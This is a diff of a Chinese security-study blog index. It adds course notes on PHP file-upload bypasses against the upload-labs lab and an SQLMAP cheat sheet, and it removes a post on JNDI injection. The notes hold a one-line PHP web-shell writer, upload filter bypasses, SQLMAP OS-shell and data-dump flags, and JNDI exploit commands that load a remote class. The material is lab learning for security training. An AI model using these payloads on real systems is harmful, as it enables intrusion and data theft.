@@ -201,6 +201,270 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/24/47WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z7">
+      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/24/47WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">47WEB攻防-php文件上传</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-24 19:45:11" itemprop="dateCreated datePublished" datetime="2023-10-24T19:45:11+08:00">2023-10-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-06 21:25:43" itemprop="dateModified" datetime="2023-11-06T21:25:43+08:00">2023-11-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
+<li>20、PHP-原生态-文件上传-检测后缀&amp;黑白名单</li>
+<li>21、PHP-原生态-文件上传-检测信息&amp;类型内容</li>
+<li>22、PHP-原生态-文件上传-函数缺陷&amp;逻辑缺陷</li>
+<li>23、PHP-原生态-文件上传-版本缺陷&amp;配置缺陷</li>
+</ul>
+<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p>
+<p> <img src="/2023/10/24/47WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01.png"><br> <img src="/2023/10/24/47WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02.png"></p>
+<h2 id="学习前必读："><a href="#学习前必读：" class="headerlink" title="学习前必读："></a>学习前必读：</h2><p>1、课前一定要明白：<br>无文件解析安全问题上，格式解析是一对一的（不能jpg解析php）<br>换句话来说有解析错误配置或后缀解析漏洞时才能实现格式差异解析  </p>
+<p>2、文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在语言版本，语言函数，中间件，引用的第三方编辑器等存在缺陷地方配合利用。另外文件上传也有多个存储逻辑，不同的文件存储方案也会给攻击者带来不一样的挑战！  </p>
+<h2 id="测试环境安装参考："><a href="#测试环境安装参考：" class="headerlink" title="测试环境安装参考："></a>测试环境安装参考：</h2><p><a target="_blank" rel="noopener" href="https://github.com/ffffffff0x/f8x">https://github.com/ffffffff0x/f8x</a><br><a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a><br><a target="_blank" rel="noopener" href="https://github.com/sqlsec/upload-labs-docker">https://github.com/sqlsec/upload-labs-docker</a>  </p>
+<ul>
+<li><p>1、下载上述资源  </p>
+</li>
+<li><p>2、docker安装  </p>
+<figure class="highlight plaintext"><figcaption><span>-d 或 f8x -docker</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sqlsec/upload-labs-docker.git</span><br><span class="line">cd upload-labs-docker</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>3、进入项目文件夹  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd upload-labs-docker  </span><br><span class="line">docker pull c0ny1/upload-labs(已编辑)  </span><br><span class="line">docker run -dit -p 80:80 $(docker images | grep &quot;upload&quot; -aq)</span><br><span class="line">http://ip:80</span><br></pre></td></tr></table></figure></li>
+<li><p>4、一键部署运行</p>
+</li>
+</ul>
+<p><code>docker-compose up -d </code> </p>
+<h2 id="upload-labs-docker知识点："><a href="#upload-labs-docker知识点：" class="headerlink" title="upload-labs-docker知识点："></a>upload-labs-docker知识点：</h2><ul>
+<li><p>1、前端JS<br>如何判断是否是前端验证呢？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了</p>
+</li>
+<li><p>2、.htaccess<br>AddType application&#x2F;x-httpd-php .png  </p>
+</li>
+<li><p>3、MIME类型<br>Content-Type：image&#x2F;png  </p>
+</li>
+<li><p>4、文件头判断<br>GIF89a  </p>
+</li>
+<li><p>5、黑名单-过滤不严<br>无递归，pphphp  </p>
+</li>
+<li><p>6、黑名单-过滤不严<br>系统大小写敏感属性  </p>
+</li>
+<li><p>7、低版本GET-%00截断<br>自动解码一次<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;x.php%00  </p>
+</li>
+<li><p>8、低版本POST-%00截断<br>手工解码一次<br>..&#x2F;upload&#x2F;x.php%00 二次解码  </p>
+</li>
+<li><p>9、黑名单-过滤不严<br>php3  </p>
+</li>
+<li><p>10、逻辑不严-条件竞争  </p>
+<?php fputs(fopen('xiao.php','w'),'<?php eval($_REQUEST[1]);?><p>‘);?&gt;<br>上传不断发包<br>请求不断发包  </p>
+</li>
+<li><p>11、二次渲染<br>先搞个正常图片，上传导出渲染后的图片<br>对比保留部分，在保留部分添加后门代码<br>最后利用提示的文件包含执行图片后门代码  </p>
+</li>
+<li><p>11、函数缺陷<br>move_uploaded_file 1.php&#x2F;.  </p>
+</li>
+<li><p>12、代码审计-数组绕过  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------174283082921961</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</span><br><span class="line"></span><br><span class="line">http://2.php/</span><br><span class="line">-----------------------------174283082921961</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</span><br><span class="line"></span><br><span class="line">gif</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+ 
+
+      
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/23/46WEB%E6%94%BB%E9%98%B2-SQLMAP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z7">
+      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/23/46WEB%E6%94%BB%E9%98%B2-SQLMAP/" class="post-title-link" itemprop="url">46WEB攻防-SQLMAP</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-23 19:47:43" itemprop="dateCreated datePublished" datetime="2023-10-23T19:47:43+08:00">2023-10-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-06 21:25:38" itemprop="dateModified" datetime="2023-11-06T21:25:38+08:00">2023-11-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
+<li>16、注入工具-SQLMAP-常规猜解&amp;字典配置</li>
+<li>17、注入工具-SQLMAP-权限操作&amp;文件命令</li>
+<li>18、注入工具-SQLMAP-Tamper&amp;使用&amp;开发</li>
+<li>19、注入工具-SQLMAP-调试指纹&amp;风险等级</li>
+</ul>
+<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p>
+<p> <img src="/2023/10/23/46WEB%E6%94%BB%E9%98%B2-SQLMAP/sqlmap.png"></p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a>  </p>
+<h2 id="数据猜解-库表列数据-字典"><a href="#数据猜解-库表列数据-字典" class="headerlink" title="数据猜解-库表列数据&amp;字典"></a>数据猜解-库表列数据&amp;字典</h2><p>(sqlmap:1. 字典文件路径..&#x2F;data&#x2F;txt&#x2F;<br>2. 注入日志路径C:&#x2F;Users&#x2F;PC登录账户&#x2F;AppData&#x2F;Local&#x2F;sqlmap&#x2F;outmap&#x2F;IP  注:同一IP再次注入时，需删掉之前的注入日志。)<br>测试：<a target="_blank" rel="noopener" href="http://vulnweb.com/">http://vulnweb.com/</a>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--current-db    //非ACCESS数据库，查询当前数据库名</span><br><span class="line">--tables -D &quot;db_name&quot;</span><br><span class="line">--columns -T &quot;table_name&quot; -D &quot;db_name&quot;</span><br><span class="line">--dump -C &quot;column_name1,...&quot; -T &quot;table_name&quot; -D &quot;db_name&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="权限操作-文件-命令-交互式"><a href="#权限操作-文件-命令-交互式" class="headerlink" title="权限操作-文件&amp;命令&amp;交互式"></a>权限操作-文件&amp;命令&amp;交互式</h2><p>测试：MYSQL高权限注入<br>引出权限：<br><code>--is-dba --privileges</code><br>引出文件：<br><code>--file-read --file-write --file-dest </code><br>引出命令：<br><code>--os-cmd= --os-shell --sql-shell</code></p>
+<h2 id="提交方法-POST-HEAD-JSON"><a href="#提交方法-POST-HEAD-JSON" class="headerlink" title="提交方法-POST&amp;HEAD&amp;JSON"></a>提交方法-POST&amp;HEAD&amp;JSON</h2><p>测试：Post Cookie Json  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--data &quot;&quot;</span><br><span class="line">--cookie &quot;&quot;</span><br><span class="line">-r 1.txt</span><br></pre></td></tr></table></figure>
+<h2 id="绕过模块-Tamper脚本-使用-开发"><a href="#绕过模块-Tamper脚本-使用-开发" class="headerlink" title="绕过模块-Tamper脚本-使用&amp;开发"></a>绕过模块-Tamper脚本-使用&amp;开发</h2><p>测试：base64注入 有过滤的注入  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">--tamper=base64encode.py</span><br><span class="line">--tamper=test.py</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    if payload:      </span><br><span class="line">        payload = payload.replace(&#x27;SELECT&#x27;,&#x27;sElEct&#x27;)</span><br><span class="line">        payload = payload.replace(&#x27;OR&#x27;,&#x27;Or&#x27;)</span><br><span class="line">        payload = payload.replace(&#x27;AND&#x27;,&#x27;And&#x27;)</span><br><span class="line">        payload = payload.replace(&#x27;SLEEP&#x27;,&#x27;SleeP&#x27;)</span><br><span class="line">        payload = payload.replace(&#x27;ELT&#x27;,&#x27;Elt&#x27;)</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析拓展-代理-调试-指纹-风险-等级"><a href="#分析拓展-代理-调试-指纹-风险-等级" class="headerlink" title="分析拓展-代理&amp;调试&amp;指纹&amp;风险&amp;等级"></a>分析拓展-代理&amp;调试&amp;指纹&amp;风险&amp;等级</h2><ul>
+<li>1、后期分析调试：<br>-v&#x3D;(0-6)  #详细的等级(0-6)</li>
+</ul>
+<p><code>--proxy &quot;http://xx:xx&quot; #代理注入</code></p>
+<ul>
+<li>2、打乱默认指纹：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--user-agent &quot;&quot;  #自定义user-agent</span><br><span class="line">--random-agent   #随机user-agent</span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5</span><br></pre></td></tr></table></figure></li>
+<li>3、使用更多的测试：测试Header注入  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+ 
+
+      
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/22/45WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1188,262 +1452,6 @@
 
  
 
-      
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/37%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="z7">
-      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/18/37%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">37安全开发-JavaEE应用</a>
-        </h2>
-
-        <div class="post-meta">
-	
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-18 10:39:37" itemprop="dateCreated datePublished" datetime="2023-10-18T10:39:37+08:00">2023-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-06 21:11:07" itemprop="dateModified" datetime="2023-11-06T21:11:07+08:00">2023-11-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>4.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
-<li>41、JavaEE-JNDI注入-RMI&amp;LDAP</li>
-<li>42、JavaEE-漏洞结合-FastJson链</li>
-<li>43、JavaEE-漏洞条件-JDK版本绕过</li>
-</ul>
-<h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul>
-<li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li>
-<li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li>
-<li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li>
-</ul>
-<p> <img src="/2023/10/18/37%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/JNDI2.png"><br> <img src="/2023/10/18/37%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/JNDI3.png"></p>
-<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>思考明白：<br>什么是jndi注入<br>为什么有jndi注入<br>JDNI注入安全问题<br>JDNI注入利用条件<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/dupei/article/details/120534024">https://blog.csdn.net/dupei/article/details/120534024</a>  </p>
-<h2 id="JNDI注入-RMI-LDAP服务"><a href="#JNDI注入-RMI-LDAP服务" class="headerlink" title="JNDI注入-RMI&amp;LDAP服务"></a>JNDI注入-RMI&amp;LDAP服务</h2><p>[将JNDI规范看成是一个让配置参数和代码解耦的一种规范和思想会更好理解一些。比如说常见的在DAO层通过原始的JDBC来连接数据库，我们可以选择在代码中直接写入数据库的连接参数，但一旦数据源发生变更，我们就势必要改动代码后重新编译才能连接新的数据源。而如果我们将数据库连接参数改成外部配置的方式，那么也就实现了配置和代码之间的解耦]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。<br>RMI：远程方法调用注册表<br>LDAP：轻量级目录访问协议  </p>
-<h3 id="调用检索："><a href="#调用检索：" class="headerlink" title="调用检索："></a>调用检索：</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。  javax.naming.InitialContext.lookup()(专门实现jndi注入的)</p>
-<ul>
-<li><p>在RMI服务中调用了InitialContext.lookup()的类有：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.transaction.jta.JtaTransactionManager.readObject()</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl.execute()</span><br><span class="line">javax.management.remote.rmi.RMIConnector.connect()</span><br><span class="line">org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>在LDAP服务中调用了InitialContext.lookup()的类有：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InitialDirContext.lookup()</span><br><span class="line">Spring LdapTemplate.lookup()</span><br><span class="line">LdapTemplate.lookupContext()</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="JNDI远程调用-JNDI-Injection"><a href="#JNDI远程调用-JNDI-Injection" class="headerlink" title="JNDI远程调用-JNDI-Injection"></a>JNDI远程调用-JNDI-Injection</h3><p>基于工具自主定义（节省下述2,4步骤）   </p>
-<ul>
-<li>1、使用远程调用(默认端口1389)  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new InitialContext().lookup(&quot;ldap://xx.xx.xx.xx:1389/Test&quot;);</span><br><span class="line">new InitialContext().lookup(&quot;rmi://xx.xx.xx.xx:1099/Test&quot;);</span><br></pre></td></tr></table></figure></li>
-<li>2、使用利用工具生成调用地址  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A xx.xx.xx.xx    (其实这里jndi工具会自动在服务端生成一个执行calc的class文件)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="JNDI远程调用-marshalsec"><a href="#JNDI远程调用-marshalsec" class="headerlink" title="JNDI远程调用-marshalsec"></a>JNDI远程调用-marshalsec</h3><ul>
-<li>1、使用远程调用(默认端口1389)  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new InitialContext().lookup(&quot;ldap://xx.xx.xx.xx:1389/Test&quot;);</span><br><span class="line">new InitialContext().lookup(&quot;rmi://xx.xx.xx.xx:1099/Test&quot;);</span><br></pre></td></tr></table></figure></li>
-<li>2、编译调用对象<br>javac Test.java</li>
-<li>3、使用利用工具生成调用协议（rmi,ldap）  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0/#Test</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://0.0.0.0/#Test</span><br></pre></td></tr></table></figure></li>
-<li>4、将生成的Class存放访问路径</li>
-</ul>
-<h3 id="JNDI-Injection-marshalsec-实现原理："><a href="#JNDI-Injection-marshalsec-实现原理：" class="headerlink" title="JNDI-Injection &amp; marshalsec 实现原理："></a>JNDI-Injection &amp; marshalsec 实现原理：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">例：RMI调用  </span><br><span class="line">//bind：将名称绑定到对象中；  </span><br><span class="line">//lookup：通过名字检索执行的对象；  </span><br><span class="line">//Reference类表示对存在于命名/目录系统以外的对象的引用。  </span><br><span class="line">//Reference参数：  </span><br><span class="line">//className：远程加载时所使用的类名；  </span><br><span class="line">//classFactory：加载的class中需要实例化类的名称；  </span><br><span class="line">//classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；  </span><br><span class="line"></span><br><span class="line">Registry registry= LocateRegistry.createRegistry(1099);</span><br><span class="line">Reference reference = new Reference(&quot;Calc&quot;, &quot;Calc&quot;, &quot;http://localhost/&quot;);</span><br><span class="line">ReferenceWrapper wrapper = new ReferenceWrapper(reference);</span><br><span class="line">registry.bind(&quot;calc&quot;, wrapper);</span><br></pre></td></tr></table></figure>
